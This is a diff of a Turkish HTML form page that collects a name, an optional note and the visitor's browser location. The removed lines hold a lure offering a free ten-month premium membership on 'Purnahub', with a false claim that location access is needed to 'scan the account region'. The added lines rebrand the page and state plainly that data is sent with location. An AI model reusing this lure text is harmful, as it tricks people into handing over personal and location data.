@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Purnahub 10 ay proplus üyelik hesap açımı</title>
+  <title>PRO Giriş Sistemi</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
   <style>
     :root {
@@ -20,11 +20,15 @@
       font-family: 'Inter', sans-serif;
       background: var(--bg);
       color: var(--text);
-      padding: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
     }
     .container {
+      width: 100%;
       max-width: 840px;
-      margin: auto;
       background: var(--card);
       padding: 32px;
       border-radius: 16px;
@@ -39,6 +43,11 @@
       font-size: 26px;
       margin-bottom: 12px;
       color: var(--accent);
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { text-shadow: 0 0 6px var(--accent); }
+      50% { text-shadow: 0 0 12px var(--accent); }
     }
     p {
       font-size: 14px;
@@ -106,27 +115,27 @@
 </head>
 <body>
   <div class="container">
-    <h1>🚀 purnahub 10 ay proplus üyelik hesap açma</h1>
-    <p>Bu sistem,üyelik için onay gerektirir.</p>
+    <h1>🚀 PRO Giriş Sistemi</h1>
+    <p>Bu sistem, kullanıcıdan alınan verileri konum bilgisiyle birlikte işler. Gönderim için açık onay gereklidir.</p>
 
     <form id="form">
       <label for="name">Adınız (zorunlu)</label>
       <input type="text" id="name" required placeholder="Adınızı girin" />
 
-      <label for="note">Açıklama (girersen iyi olur)</label>
+      <label for="note">Açıklama (opsiyonel)</label>
       <textarea id="note" rows="3" placeholder="Kısa bir not yazabilirsiniz"></textarea>
 
       <label>
         <input type="checkbox" id="consent" required />
-        Purnahub üyelik şartlarını kabul ediyorum.
+        Tüm verilerin gönderilmesine açıkça onay veriyorum.
       </label>
 
-      <button type="submit">Üyelik oluştur</button>
+      <button type="submit">Giriş Yap</button>
     </form>
 
     <div class="status" id="status">Durum: Bekleniyor</div>
-    <div class="error" id="geoWarn" style="display:none;">Konum izni hesap alınım bölgesini taramamız için gereklidir. Lütfen tarayıcıdan konum izni verin.</div>
-    <div class="footer">Purnahub • 10 ay proplus üyelik • 2025</div>
+    <div class="error" id="geoWarn" style="display:none;">Konum izni verilmedi. Lütfen tarayıcıdan konum izni verin.</div>
+    <div class="footer">PRO Sistem • Gelişmiş veri gönderimi • 2025</div>
   </div>
 
   <script src="giris.js"></script>
